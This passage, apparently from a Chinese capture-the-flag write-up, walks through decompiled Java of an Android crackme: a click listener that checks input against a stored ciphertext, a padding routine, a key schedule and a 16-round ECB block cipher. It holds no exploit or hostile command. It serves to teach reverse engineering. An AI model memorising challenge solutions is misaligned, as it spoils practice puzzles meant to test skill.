class="number">9</span>, <span class="number">22</span>, -<span class="number">51</span>, <span class="number">0x5F</span>, -<span class="number">34</span>, <span class="number">12</span>, <span class="number">0x2F</span>, <span class="number">77</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">byte</span>[] a(String arg1, String arg2) &#123;</span><br><span class="line">        <span class="keyword">return</span> MainActivity.b(arg1, arg2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] b(String arg7, String arg8) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] v0_1;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedInputStream v2 = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> ByteArrayInputStream(arg7.getBytes()));</span><br><span class="line">            <span class="keyword">byte</span>[] v1 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">            ArrayList v3 = <span class="keyword">new</span> ArrayList();</span><br><span class="line">            Object v4 = b.a(arg8.getBytes()); <span class="comment">// 处理密钥</span></span><br><span class="line">            <span class="keyword">while</span>(v2.read(v1, <span class="number">0</span>, <span class="number">16</span>) != -<span class="number">1</span>) &#123; <span class="comment">// 循环加密，采用ECB模式</span></span><br><span class="line">                v3.add(b.a(v1, <span class="number">0</span>, v4));</span><br><span class="line">                v1 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ByteBuffer v2_1 = ByteBuffer.allocate(v3.size() * <span class="number">16</span>); <span class="comment">// 转换成字节数组</span></span><br><span class="line">            Object[] v3_1 = v3.toArray();</span><br><span class="line">            <span class="keyword">int</span> v4_1 = v3_1.length;</span><br><span class="line">            <span class="keyword">int</span> v1_1;</span><br><span class="line">            <span class="keyword">for</span>(v1_1 = <span class="number">0</span>; v1_1 &lt; v4_1; ++v1_1) &#123;</span><br><span class="line">                v2_1.put(v3_1[v1_1]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v0_1 = v2_1.array();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">            v0_1 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v0_1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">byte</span>[] i() &#123; <span class="comment">// Cipheretxt</span></span><br><span class="line">        <span class="keyword">return</span> MainActivity.m;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg4)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg4);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F04001A</span>); <span class="comment">// activity_main</span></span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">0x7F0B0055</span>).setOnClickListener(<span class="keyword">new</span> a(<span class="keyword">this</span>, <span class="keyword">this</span>.findViewById(<span class="number">0x7F0B0054</span>), ((Context)<span class="keyword">this</span>))); <span class="comment">// button | edit_text</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类 a 中设置了一个监听按钮的事件，并将输入和指定的字符串作为参数传入 MainActivity 的函数 a。并与密文进行比较：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.a.sample.findmydex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.view.View$OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> <span class="keyword">implements</span> <span class="title">View</span>$<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    a(MainActivity arg1, EditText arg2, Context arg3) &#123;</span><br><span class="line">        <span class="keyword">this</span>.c = arg1;</span><br><span class="line">        <span class="keyword">this</span>.a = arg2;</span><br><span class="line">        <span class="keyword">this</span>.b = arg3;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg5)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(Arrays.equals(MainActivity.a(<span class="keyword">this</span>.a.getText().toString(), <span class="keyword">this</span>.c.getString(<span class="number">0x7F060023</span>)), MainActivity.i())) &#123; <span class="comment">// I have a male fish and a female fish.</span></span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>.b, <span class="keyword">this</span>.c.getString(<span class="number">0x7F060025</span>), <span class="number">1</span>).show(); <span class="comment">// Yes! You got me! :)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>.b, <span class="keyword">this</span>.c.getString(<span class="number">0x7F060022</span>), <span class="number">1</span>).show(); <span class="comment">// NO~ You don't get me~ T_T</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>b 类的 a 函数主要将数组的长度补齐成 8 的倍数，并调用 b 函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] arg5)</span> </span>&#123; <span class="comment">// 补齐块</span></span><br><span class="line">    Object v0_3;</span><br><span class="line">    <span class="keyword">int</span> v1 = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">    Class v2 = b.class;</span><br><span class="line">    __monitor_enter(v2);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(arg5.length &gt; v1 || arg5.length % <span class="number">8</span> != <span class="number">0</span>) &#123; <span class="comment">// 长度大于32或不是8的倍数</span></span><br><span class="line">            <span class="keyword">if</span>(arg5.length &lt;= v1) &#123;</span><br><span class="line">                v1 = arg5.length;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>((v1 &amp; <span class="number">7</span>) &gt; <span class="number">0</span>) &#123; <span class="comment">// 判断数组长度是否是8的倍数，不是的话补齐</span></span><br><span class="line">                v0 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] v0_2 = <span class="keyword">new</span> <span class="keyword">byte</span>[v0 * <span class="number">8</span> + v1];</span><br><span class="line">            System.arraycopy(arg5, <span class="number">0</span>, v0_2, <span class="number">0</span>, v1);</span><br><span class="line">            arg5 = v0_2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v0_3 = b.b(arg5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Throwable v0_1) &#123;</span><br><span class="line">        __monitor_exit(v2);</span><br><span class="line">        <span class="keyword">throw</span> v0_1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __monitor_exit(v2);</span><br><span class="line">    <span class="keyword">return</span> v0_3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>b 类中的 b 函数是一个处理密钥的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">b</span><span class="params">(<span class="keyword">byte</span>[] arg19)</span> </span>&#123; <span class="comment">// 处理密钥</span></span><br><span class="line">    Object[] v1_2;</span><br><span class="line">    <span class="keyword">int</span>[] v13;</span><br><span class="line">    <span class="keyword">int</span> v10_1;</span><br><span class="line">    <span class="keyword">int</span> v9_1;</span><br><span class="line">    <span class="keyword">int</span> v8_1;</span><br><span class="line">    <span class="keyword">int</span>[] v11_1;</span><br><span class="line">    <span class="keyword">int</span> v12;</span><br><span class="line">    <span class="keyword">int</span> v3;</span><br><span class="line">    <span class="keyword">int</span> v1_1;</span><br><span class="line">    <span class="keyword">int</span> v5;</span><br><span class="line">    <span class="keyword">int</span> v4;</span><br><span class="line">    Class v6 = b.class;</span><br><span class="line">    __monitor_enter(v6);</span><br><span class="line">    <span class="keyword">if</span>(arg19 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        goto label_10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidKeyException(<span class="string">"Empty key"</span>);</span><br><span class="line">    label_10:</span><br><span class="line">        v4 = arg19.length;</span><br><span class="line">        <span class="keyword">if</span>(v4 != <span class="number">8</span> &amp;&amp; v4 != <span class="number">16</span> &amp;&amp; v4 != <span class="number">24</span> &amp;&amp; v4 != <span class="number">0x20</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidKeyException(<span class="string">"Incorrect key length"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v7 = v4 / <span class="number">8</span>;</span><br><span class="line">        v5 = <span class="number">40</span>;</span><br><span class="line">        <span class="keyword">int</span>[] v8 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">int</span>[] v9 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">int</span>[] v10 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">4</span>];</span><br><span class="line">        v1_1 = <span class="number">0</span>;</span><br><span class="line">        v3 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> v2;</span><br><span class="line">        <span class="keyword">for</span>(v2 = v7 - <span class="number">1</span>; v3 &lt; <span class="number">4</span>; --v2) &#123;</span><br><span class="line">            <span class="keyword">if</span>(v1_1 &gt;= v4) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> v11 = v1_1 + <span class="number">1</span>;</span><br><span class="line">            v12 = v11 + <span class="number">1</span>;</span><br><span class="line">            v1_1 = arg19[v1_1] &amp; <span class="number">0xFF</span> | (arg19[v11] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">            v11 = v12 + <span class="number">1</span>;</span><br><span class="line">            v1_1 |= (arg19[v12] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">            v12 = v11 + <span class="number">1</span>;</span><br><span class="line">            v8[v3] = v1_1 | (arg19[v11] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">            v1_1 = v12 + <span class="number">1</span>;</span><br><span class="line">            v11 = arg19[v12] &amp; <span class="number">0xFF</span>;</span><br><span class="line">            v12 = v1_1 + <span class="number">1</span>;</span><br><span class="line">            v1_1 = (arg19[v1_1] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span> | v11;</span><br><span class="line">            v11 = v12 + <span class="number">1</span>;</span><br><span class="line">            v12 = (arg19[v12] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span> | v1_1;</span><br><span class="line">            v1_1 = v11 + <span class="number">1</span>;</span><br><span class="line">            v9[v3] = (arg19[v11] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span> | v12;</span><br><span class="line">            v10[v2] = b.a(v8[v3], v9[v3]);</span><br><span class="line">            ++v3;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v11_1 = <span class="keyword">new</span> <span class="keyword">int</span>[v5];</span><br><span class="line">        v1_1 = <span class="number">0</span>;</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(v2 &lt; <span class="number">20</span>) &#123;</span><br><span class="line">            v3 = b.a(v7, v1_1, v8);</span><br><span class="line">            v4 = b.a(v7, <span class="number">0x1010101</span> + v1_1, v9);</span><br><span class="line">            v4 = v4 &gt;&gt;&gt; <span class="number">24</span> | v4 &lt;&lt; <span class="number">8</span>;</span><br><span class="line">            v3 += v4;</span><br><span class="line">            v11_1[v2 * <span class="number">2</span>] = v3;</span><br><span class="line">            v3 += v4;</span><br><span class="line">            v11_1[v2 * <span class="number">2</span> + <span class="number">1</span>] = v3 &gt;&gt;&gt; <span class="number">23</span> | v3 &lt;&lt; <span class="number">9</span>;</span><br><span class="line">            ++v2;</span><br><span class="line">            v1_1 += <span class="number">0x2020202</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v8_1 = v10[<span class="number">0</span>];</span><br><span class="line">        v9_1 = v10[<span class="number">1</span>];</span><br><span class="line">        v12 = v10[<span class="number">2</span>];</span><br><span class="line">        v10_1 = v10[<span class="number">3</span>];</span><br><span class="line">        v13 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0x400</span>];</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        label_120:</span><br><span class="line">            <span class="keyword">if</span>(v2 &gt;= <span class="number">0x100</span>) &#123;</span><br><span class="line">                goto label_324;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span>(v7 &amp; <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line">                    goto label_183;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                    goto label_126;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                    goto label_332;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">                    goto label_337;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            goto label_124;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Throwable v1) &#123;</span><br><span class="line">        goto label_8;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">label_337:</span><br><span class="line">    v1_1 = v2;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    v4 = v2;</span><br><span class="line">    v5 = v2;</span><br><span class="line">    goto label_211;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    label_183:</span><br><span class="line">        v5 = b.a[<span class="number">1</span>][v2] &amp; <span class="number">0xFF</span> ^ b.e(v10_1);</span><br><span class="line">        v4 = b.a[<span class="number">0</span>][v2] &amp; <span class="number">0xFF</span> ^ b.f(v10_1);</span><br><span class="line">        v3 = b.g(v10_1) ^ b.a[<span class="number">0</span>][v2] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        v1_1 = b.a[<span class="number">1</span>][v2] &amp; <span class="number">0xFF</span> ^ b.h(v10_1);</span><br><span class="line">    label_211:</span><br><span class="line">        v5 = b.a[<span class="number">1</span>][v5] &amp; <span class="number">0xFF</span> ^ b.e(v12);</span><br><span class="line">        v4 = b.a[<span class="number">1</span>][v4] &amp; <span class="number">0xFF</span> ^ b.f(v12);</span><br><span class="line">        v3 = b.a[<span class="number">0</span>][v3] &amp; <span class="number">0xFF</span> ^ b.g(v12);</span><br><span class="line">        v1_1 = b.a[<span class="number">0</span>][v1_1] &amp; <span class="number">0xFF</span> ^ b.h(v12);</span><br><span class="line">        goto label_239;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Throwable v1) &#123;</span><br><span class="line">        goto label_8;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">label_332:</span><br><span class="line">    v1_1 = v2;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    v4 = v2;</span><br><span class="line">    v5 = v2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    label_239:</span><br><span class="line">        v13[v2 * <span class="number">2</span>] = b.b[<span class="number">0</span>][b.a[<span class="number">0</span>][b.a[<span class="number">0</span>][v5] &amp; <span class="number">0xFF</span> ^ b.e(v9_1)] &amp; <span class="number">0xFF</span> ^ b.e(v8_1)];</span><br><span class="line">        v13[v2 * <span class="number">2</span> + <span class="number">1</span>] = b.b[<span class="number">1</span>][b.a[<span class="number">0</span>][b.a[<span class="number">1</span>][v4] &amp; <span class="number">0xFF</span> ^ b.f(v9_1)] &amp; <span class="number">0xFF</span> ^ b.f(v8_1)];</span><br><span class="line">        v13[v2 * <span class="number">2</span> + <span class="number">0x200</span>] = b.b[<span class="number">2</span>][b.a[<span class="number">1</span>][b.a[<span class="number">0</span>][v3] &amp; <span class="number">0xFF</span> ^ b.g(v9_1)] &amp; <span class="number">0xFF</span> ^ b.g(v8_1)];</span><br><span class="line">        v13[v2 * <span class="number">2</span> + <span class="number">0x201</span>] = b.b[<span class="number">3</span>][b.a[<span class="number">1</span>][b.a[<span class="number">1</span>][v1_1] &amp; <span class="number">0xFF</span> ^ b.h(v9_1)] &amp; <span class="number">0xFF</span> ^ b.h(v8_1)];</span><br><span class="line">        goto label_124;</span><br><span class="line">    label_126:</span><br><span class="line">        v13[v2 * <span class="number">2</span>] = b.b[<span class="number">0</span>][b.a[<span class="number">0</span>][v2] &amp; <span class="number">0xFF</span> ^ b.e(v8_1)];</span><br><span class="line">        v13[v2 * <span class="number">2</span> + <span class="number">1</span>] = b.b[<span class="number">1</span>][b.a[<span class="number">0</span>][v2] &amp; <span class="number">0xFF</span> ^ b.f(v8_1)];</span><br><span class="line">        v13[v2 * <span class="number">2</span> + <span class="number">0x200</span>] = b.b[<span class="number">2</span>][b.a[<span class="number">1</span>][v2] &amp; <span class="number">0xFF</span> ^ b.g(v8_1)];</span><br><span class="line">        v13[v2 * <span class="number">2</span> + <span class="number">0x201</span>] = b.b[<span class="number">3</span>][b.a[<span class="number">1</span>][v2] &amp; <span class="number">0xFF</span> ^ b.h(v8_1)];</span><br><span class="line">    label_124:</span><br><span class="line">        ++v2;</span><br><span class="line">        goto label_120;</span><br><span class="line">    label_324:</span><br><span class="line">        v1_2 = <span class="keyword">new</span> Object[]&#123;v13, v11_1&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Throwable v1) &#123;</span><br><span class="line">        goto label_8;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __monitor_exit(v6);</span><br><span class="line">    <span class="keyword">return</span> v1_2;</span><br><span class="line">label_8:</span><br><span class="line">    __monitor_exit(v6);</span><br><span class="line">    <span class="keyword">throw</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 a 函数判断传入的字节数组、、密钥都不为空，并调用 b 函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] a(<span class="keyword">byte</span>[] arg1, <span class="keyword">int</span> arg2, Object arg3) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] v0 = arg1 == <span class="keyword">null</span> || arg3 == <span class="keyword">null</span> || arg2 &lt; <span class="number">0</span> ? <span class="keyword">null</span> : b.b(arg1, arg2, arg3);</span><br><span class="line">    <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>b 函数应该就是对数据的加密过程，明显是个 16 次轮函数的分组密码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] b(<span class="keyword">byte</span>[] arg12, <span class="keyword">int</span> arg13, Object arg14) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] v0 = arg14[<span class="number">0</span>];</span><br><span class="line">    Object v1 = arg14[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> v2 = arg13 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> v4 = v2 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> v3 = v4 + <span class="number">1</span>;</span><br><span class="line">    v2 = (arg12[v2] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span> | arg12[arg13] &amp; <span class="number">0xFF</span> | (arg12[v4] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    v4 = v3 + <span class="number">1</span>;</span><br><span class="line">    v2 |= (arg12[v3] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">    v3 = v4 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> v5 = v3 + <span class="number">1</span>;</span><br><span class="line">    v3 = (arg12[v3] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span> | arg12[v4] &amp; <span class="number">0xFF</span>;</span><br><span class="line">    v4 = v5 + <span class="number">1</span>;</span><br><span class="line">    v3 |= (arg12[v5] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    v5 = v4 + <span class="number">1</span>;</span><br><span class="line">    v3 |= (arg12[v4] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">    v4 = v5 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> v6 = v4 + <span class="number">1</span>;</span><br><span class="line">    v4 = (arg12[v4] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span> | arg12[v5] &amp; <span class="number">0xFF</span>;</span><br><span class="line">    v5 = v6 + <span class="number">1</span>;</span><br><span class="line">    v4 |= (arg12[v6] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    v6 = v5 + <span class="number">1</span>;</span><br><span class="line">    v4 |= (arg12[v5] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">    v5 = v6 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> v7 = v5 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> v8 = (arg12[v5] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span> | arg12[v6] &amp; <span class="number">0xFF</span> | (arg12[v7] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span> | (arg12[v7 + <span class="number">1</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">    v7 = v2 ^ v1[<span class="number">0</span>];</span><br><span class="line">    v6 = v3 ^ v1[<span class="number">1</span>];</span><br><span class="line">    v5 = v4 ^ 